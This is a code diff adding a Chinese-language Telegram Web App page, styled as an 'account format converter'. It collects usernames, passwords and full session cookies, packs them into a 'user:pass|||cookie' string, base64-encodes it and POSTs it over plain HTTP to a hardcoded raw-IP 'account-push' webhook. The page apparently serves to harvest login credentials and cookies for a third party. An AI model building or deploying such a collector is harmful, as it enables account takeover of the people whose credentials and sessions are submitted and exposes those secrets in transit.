@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>高级账号转换器</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --main-bg: #030712;
+      --card-bg: #111827;
+      --accent-blue: #3b82f6;
+      --accent-glow: rgba(59, 130, 246, 0.5);
+      --success-green: #10b981;
+      --error-red: #f43f5e;
+      --text-main: #f8fafc;
+      --text-dim: #94a3b8;
+      --border-color: #1f2937;
+    }
+
+    body {
+      margin: 0;
+      background-color: var(--main-bg);
+      color: var(--text-main);
+      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+      padding: 16px;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* 🌊 Refresh Wave Effect */
+    #blur-layer {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(0px);
+      background: rgba(255, 255, 255, 0);
+      z-index: 2000;
+      pointer-events: none;
+      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .wave {
+      width: 0%; height: 0%;
+      background: radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 70%);
+      border-radius: 50%;
+      transition: 0.6s ease-out;
+    }
+
+    /* 📦 Main Container */
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+      padding-top: 10px;
+    }
+    .header h1 {
+      font-size: 22px;
+      margin: 0;
+      background: linear-gradient(to right, #60a5fa, #3b82f6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 1px;
+    }
+
+    /* 📝 Input Cards */
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 24px;
+      padding: 24px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+      margin-bottom: 20px;
+    }
+
+    .field-group { margin-bottom: 20px; }
+    .field-group label {
+      display: block;
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 8px;
+      margin-left: 4px;
+    }
+
+    input, textarea {
+      width: 100%;
+      background: #000000;
+      border: 2px solid var(--border-color);
+      border-radius: 14px;
+      padding: 14px;
+      color: #fff;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    /* 🔵 Blue Border Focus Effect */
+    input:focus, textarea:focus {
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 15px var(--accent-glow);
+      background: #020617;
+    }
+
+    /* 🔘 Buttons */
+    .btn-stack { display: flex; flex-direction: column; gap: 12px; }
+    .btn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 16px;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.2s;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #3b82f6, #2563eb);
+      color: white;
+      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+    }
+    .btn-secondary {
+      background: transparent;
+      border: 2px solid var(--accent-blue);
+      color: var(--accent-blue);
+    }
+    .btn:active { transform: scale(0.97); }
+
+    /* 📊 Status & Output */
+    .status-area {
+      margin-top: 15px;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 13px;
+      text-align: center;
+      display: none;
+      font-weight: 500;
+    }
+    .success { background: rgba(16, 185, 129, 0.1); color: var(--success-green); border: 1px solid var(--success-green); }
+    .error { background: rgba(244, 63, 94, 0.1); color: var(--error-red); border: 1px solid var(--error-red); }
+
+    .output-preview {
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #60a5fa;
+      background: #000;
+      padding: 10px;
+      border-radius: 10px;
+      word-break: break-all;
+      display: none;
+    }
+
+    /* 🌀 Floating Fan */
+    .fan-trigger {
+      position: fixed;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 60px; height: 60px;
+      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+      color: white;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+      box-shadow: 0 0 20px var(--accent-glow);
+      z-index: 2001;
+    }
+    .rotate-anim { animation: fanRotate 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+    @keyframes fanRotate { 100% { transform: translateY(-50%) rotate(720deg); } }
+  </style>
+</head>
+<body>
+
+  <div id="blur-layer"><div class="wave" id="wave"></div></div>
+
+  <div class="fan-trigger" id="fan" onclick="runRefresh()">
+    <i class="fas fa-fan"></i>
+  </div>
+
+  <div class="container">
+    <div class="header">
+      <h1>账号格式转换系统</h1>
+    </div>
+
+    <div class="card">
+      <div class="field-group">
+        <label>用户名 (Username)</label>
+        <input type="text" id="user" placeholder="请输入用户名">
+      </div>
+
+      <div class="field-group">
+        <label>登录密码 (Password)</label>
+        <input type="password" id="pass" placeholder="请输入密码">
+      </div>
+
+      <div class="field-group">
+        <label>Cookie 数据</label>
+        <textarea id="cookie" rows="4" placeholder="在此粘贴完整的 Cookie 内容"></textarea>
+      </div>
+
+      <div class="btn-stack">
+        <button class="btn btn-primary" onclick="processConversion()">
+          <i class="fas fa-exchange-alt"></i> 立即开始转换
+        </button>
+        <button class="btn btn-secondary" onclick="processPush()">
+          <i class="fas fa-rocket"></i> 将数据推送到服务器
+        </button>
+      </div>
+
+      <div id="statusBox" class="status-area"></div>
+      <div id="resultPreview" class="output-preview"></div>
+    </div>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    // 核心转换逻辑 (Conversion Logic)
+    function processConversion() {
+      const u = document.getElementById('user').value.trim();
+      const p = document.getElementById('pass').value.trim();
+      const c = document.getElementById('cookie').value.trim();
+      const status = document.getElementById('statusBox');
+      const preview = document.getElementById('resultPreview');
+
+      // 验证: 必填项检查及 Cookie 格式验证
+      if (!u || !p || !c || !c.includes('=')) {
+        updateStatus('❌ 验证失败：请确保所有项已填写且 Cookie 格式正确', true);
+        preview.style.display = 'none';
+        return;
+      }
+
+      // 转换格式: user:pass|||cookie||
+      const finalString = `${u}:${p}|||${c}||`;
+      window.savedData = finalString;
+
+      preview.textContent = finalString;
+      preview.style.display = 'block';
+      updateStatus('✅ 转换成功：数据已锁定并准备推送', false);
+    }
+
+    // 推送逻辑 (Push Logic)
+    async function processPush() {
+      if (!window.savedData) {
+        updateStatus('⚠️ 错误：请先完成格式转换', true);
+        return;
+      }
+
+      updateStatus('⏳ 正在连接服务器，请稍候...', false);
+      const endpoint = 'http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push';
+      const payload = `accounts=${btoa(window.savedData)}`;
+
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain' },
+          body: payload,
+        });
+
+        if (response.ok) {
+          const json = await response.json();
+          const d = json.data;
+          updateStatus(`🚀 推送完成 | 成功: ${d.success_count} | 失败: ${d.failed_count}`, d.failed_count > 0);
+        } else {
+          updateStatus('❌ 推送失败：服务器响应异常', true);
+        }
+      } catch (err) {
+        updateStatus(`❌ 网络错误: ${err.message}`, true);
+      }
+    }
+
+    // 刷新动画 (Professional Refresh)
+    function runRefresh() {
+      const fan = document.getElementById('fan');
+      const blur = document.getElementById('blur-layer');
+      const wave = document.getElementById('wave');
+
+      fan.classList.add('rotate-anim');
+      blur.style.backdropFilter = 'blur(15px)';
+      blur.style.background = 'rgba(15, 23, 42, 0.4)';
+      wave.style.width = '300%'; wave.style.height = '300%';
+
+      setTimeout(() => {
+        document.getElementById('user').value = '';
+        document.getElementById('pass').value = '';
+        document.getElementById('cookie').value = '';
+        document.getElementById('statusBox').style.display = 'none';
+        document.getElementById('resultPreview').style.display = 'none';
+        window.savedData = null;
+      }, 300);
+
+      setTimeout(() => {
+        fan.classList.remove('rotate-anim');
+        blur.style.backdropFilter = 'blur(0px)';
+        blur.style.background = 'rgba(255, 255, 255, 0)';
+        wave.style.width = '0%'; wave.style.height = '0%';
+      }, 700);
+    }
+
+    function updateStatus(msg, isError) {
+      const box = document.getElementById('statusBox');
+      box.style.display = 'block';
+      box.innerHTML = msg;
+      box.className = `status-area ${isError ? 'error' : 'success'}`;
+    }
+  </script>
+</body>
+</html>
